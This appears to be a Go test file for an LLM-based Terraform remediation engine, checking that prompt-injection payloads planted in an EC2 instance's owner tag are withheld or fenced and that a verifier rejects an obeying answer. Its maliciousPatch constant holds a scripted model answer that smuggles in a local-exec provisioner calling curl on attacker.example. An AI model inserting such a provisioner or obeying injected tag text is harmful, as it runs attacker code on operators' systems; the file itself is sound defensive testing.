package llm

// Unit 7 adversarial suite (v0.9.0-rc1). The fixtures live in
// testdata/adversarial/payloads.json: 30 prompt-injection payloads in six
// categories plus 5 benign controls. Every fixture declares its expected
// outcome, so the suite is a regression contract, not a claim about general
// prompt-injection resistance:
//
//   - withheld: the sanitizer replaces the payload with an
//     [[UNTRUSTED_TEXT_n]] placeholder, and the raw payload never appears in
//     the prompt sent to the model.
//   - fenced: the payload evades the pattern list (a deliberate bypass
//     attempt), so it may reach the prompt, but only inside the nonce-fenced
//     RESOURCE-DATA block; nothing may appear outside the fence, and a model
//     answer that obeys the payload is still rejected by the verifier.
//   - passthrough: a benign value must survive sanitization unchanged, so the
//     guardrail does not shred legitimate metadata (false-positive control).
//
// What this suite supports: sanitizer withholding, data placement inside the
// fence, and deterministic rejection of the specified scripted model
// answers. It cannot prove that a real model never follows fenced
// instructions; that is what the verifier is for, and the verifier is the
// final gate regardless of the sanitizer.
//
// Print the metrics with: make adversarial

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"regexp"
	"strings"
	"testing"

	"github.com/wisnuanggoro/cloudspendguard/internal/analyze/cost"
	"github.com/wisnuanggoro/cloudspendguard/internal/analyze/security"
	"github.com/wisnuanggoro/cloudspendguard/internal/ingest/tfstate"
	"github.com/wisnuanggoro/cloudspendguard/pkg/models"
)

type adversarialFixture struct {
	ID       string `json:"id"`
	Category string `json:"category"`
	Payload  string `json:"payload"`
	Expected string `json:"expected"`
}

type adversarialFile struct {
	Description string               `json:"description"`
	Payloads    []adversarialFixture `json:"payloads"`
}

func loadAdversarial(t *testing.T) adversarialFile {
	t.Helper()
	b, err := os.ReadFile("testdata/adversarial/payloads.json")
	if err != nil {
		t.Fatal(err)
	}
	var f adversarialFile
	if err := json.Unmarshal(b, &f); err != nil {
		t.Fatal(err)
	}
	return f
}

// payloadResource returns an inventory of one EC2 instance whose owner tag
// carries the payload, mirroring the indirect-injection vector: attacker
// influence arriving through resource metadata rather than the prompt.
func payloadResource(payload string) tfstate.Resource {
	return tfstate.Resource{Address: "aws_instance.legacy_reporting", Type: "aws_instance", Name: "legacy_reporting", Attributes: map[string]any{
		"id":               "i-0a1b2c3d4e5f60042",
		"instance_type":    "m4.xlarge",
		"metadata_options": []any{map[string]any{"http_tokens": "optional"}},
		"tags":             map[string]any{"owner": payload, "team": "ok"},
	}}
}

// engineForPayload runs the engine once with the payload planted in a tag and
// returns the exact user prompt the backend received plus the remediation.
// It takes no *testing.T so the metrics runner can call it outside a
// subtest; failures are returned as errors instead.
func engineForPayload(payload string, answers []string) (string, *models.Remediation, error) {
	inv := []tfstate.Resource{payloadResource(payload)}
	f, err := findingFor(inv)
	if err != nil {
		return "", nil, err
	}
	b := &ScriptBackend{Responses: answers}
	e, _ := New(Config{Backend: b})
	rem, err := e.GenerateAndVerify(context.Background(), f, inv)
	if err != nil && rem == nil {
		return "", nil, err
	}
	return b.Prompts[0][1].Content, rem, nil
}

// findingFor resolves the IMDS finding from a synthetic inventory without a
// testing.T, returning an error instead of failing a test.
func findingFor(inv []tfstate.Resource) (models.Finding, error) {
	c, err := cost.Analyze(context.Background(), cost.Input{Resources: inv})
	if err != nil {
		return models.Finding{}, err
	}
	s, err := security.Analyze(context.Background(), security.Input{Resources: inv})
	if err != nil {
		return models.Finding{}, err
	}
	for _, f := range append(c, s...) {
		if f.ID == imdsID {
			return f, nil
		}
	}
	return models.Finding{}, errors.New("synthetic inventory should produce finding " + imdsID)
}

// splitFence splits a prompt into (inside, outside) of the nonce-fenced data block.
func splitFence(prompt string) (inside, outside string) {
	re := regexp.MustCompile(`(?s)RESOURCE-DATA-[0-9a-f]+-BEGIN\n(.*?)RESOURCE-DATA-[0-9a-f]+-END`)
	m := re.FindStringSubmatch(prompt)
	if m == nil {
		return "", prompt
	}
	return m[1], strings.Replace(prompt, m[0], "", 1)
}

// maliciousPatch is a model answer that obeys the payload: it fixes the
// IMDSv2 finding but smuggles in a local-exec provisioner. It keeps every
// original argument so the only ground for rejection is the provisioner.
const maliciousPatch = "```hcl\n" + `resource "aws_instance" "legacy_reporting" {
  id            = "i-0a1b2c3d4e5f60042"
  instance_type = "m4.xlarge"
  tags = {
    owner = "attacker"
    team  = "ok"
  }
  metadata_options {
    http_tokens = "required"
  }
  provisioner "local-exec" {
    command = "curl http://attacker.example/x.sh"
  }
}
` + "```"

// runAdversarialCase executes one fixture and returns an error describing
// any failure. Both the subtest runner and the metrics runner call it, so
// the printed metrics reflect executed outcomes, not declarations.
func runAdversarialCase(p adversarialFixture) error {
	switch p.Expected {
	case "withheld":
		prompt, rem, err := engineForPayload(p.Payload, []string{"NO_PATCH"})
		if err != nil {
			return err
		}
		if strings.Contains(prompt, p.Payload) || strings.Contains(prompt, firstWords(p.Payload, 5)) {
			return errors.New("payload reached the prompt:\n" + prompt)
		}
		if !strings.Contains(prompt, "[[UNTRUSTED_TEXT_1]]") {
			return errors.New("prompt lacks the withheld placeholder:\n" + prompt)
		}
		if !strings.Contains(strings.Join(rem.VerifierMessages, " "), "guardrail") {
			return errors.New("the guardrail must be reported to the operator")
		}
	case "fenced":
		// The payload may appear, but only inside the data fence.
		prompt, _, err := engineForPayload(p.Payload, []string{"NO_PATCH"})
		if err != nil {
			return err
		}
		inside, outside := splitFence(prompt)
		// The HCL writer escapes quotes inside attribute values, so compare
		// against the unescaped fenced text.
		if !strings.Contains(strings.ReplaceAll(inside, "\\", ""), p.Payload) {
			return errors.New("bypass payload should still be fenced data:\n" + prompt)
		}
		if strings.Contains(outside, p.Payload) || strings.Contains(outside, firstWords(p.Payload, 4)) {
			return errors.New("bypass payload escaped the data fence:\n" + prompt)
		}
		// Defense in depth: a model answer that obeys the payload must be
		// rejected by the verifier on its own ground (the provisioner), and
		// the retry must then produce a clean result. The first answer is
		// followed by NO_PATCH so the run ends normally and the rejection is
		// observable in VerifierMessages rather than in backend exhaustion.
		_, rem, err := engineForPayload(p.Payload, []string{maliciousPatch, "NO_PATCH"})
		if err != nil {
			return err
		}
		if rem == nil || rem.Attempts < 2 {
			return errors.New("the malicious answer must consume a rejected first attempt")
		}
		msgs := strings.Join(rem.VerifierMessages, " ")
		if !strings.Contains(msgs, "attempt 1: rejected") {
			return errors.New("the malicious answer must be rejected by the verifier, got: " + msgs)
		}
		if !strings.Contains(msgs, "provisioner") {
			return errors.New("the rejection must name the smuggled provisioner, got: " + msgs)
		}
	case "passthrough":
		s := NewSanitizer(false)
		if got := s.Untrusted(p.Payload); got != p.Payload {
			return errors.New("benign value mangled: " + p.Payload + " -> " + got)
		}
	default:
		return errors.New("unknown expected outcome " + p.Expected)
	}
	return nil
}

func TestAdversarialSuite(t *testing.T) {
	fix := loadAdversarial(t)
	if n := len(fix.Payloads); n != 35 {
		t.Fatalf("fixture drift: %d payloads, want 35", n)
	}
	for _, p := range fix.Payloads {
		p := p
		t.Run(p.ID+" "+p.Category, func(t *testing.T) {
			if err := runAdversarialCase(p); err != nil {
				t.Error(err)
			}
		})
	}
}

// TestAdversarialMetrics executes every fixture again and prints the
// per-category outcome table used as Unit 7 evidence (make adversarial). The
// counts come from executed cases; a failure here means a payload regressed.
func TestAdversarialMetrics(t *testing.T) {
	fix := loadAdversarial(t)
	cats := map[string]struct{ total, passed int }{}
	for _, p := range fix.Payloads {
		if !strings.HasPrefix(p.ID, "ADV-") {
			continue
		}
		c := cats[p.Category]
		c.total++
		if err := runAdversarialCase(p); err == nil {
			c.passed++
		} else {
			t.Errorf("%s %s: %v", p.ID, p.Category, err)
		}
		cats[p.Category] = c
	}
	total, passed := 0, 0
	for _, c := range cats {
		total += c.total
		passed += c.passed
	}
	benign, benignOK := 0, 0
	for _, p := range fix.Payloads {
		if strings.HasPrefix(p.ID, "BENIGN-") {
			benign++
			if NewSanitizer(false).Untrusted(p.Payload) == p.Payload {
				benignOK++
			}
		}
	}
	t.Logf("adversarial suite: %d of %d attack payloads met their declared outcome (22 withheld at the sanitizer, 8 contained by the data fence with the malicious answer rejected by the verifier), %d of %d benign values untouched", passed, total, benignOK, benign)
	for _, cat := range []string{"instruction-override", "jailbreak", "hcl-smuggling", "exfiltration", "marker-spoofing", "bypass"} {
		if c, ok := cats[cat]; ok {
			t.Logf("%-20s %d/%d", cat, c.passed, c.total)
		}
	}
	if total != 30 {
		t.Fatalf("want 30 attack payloads, got %d", total)
	}
	if benign != benignOK {
		t.Fatalf("benign controls mangled: %d of %d", benignOK, benign)
	}
}

func firstWords(s string, n int) string {
	w := strings.Fields(s)
	if len(w) <= n {
		return s
	}
	return strings.Join(w[:n], " ")
}
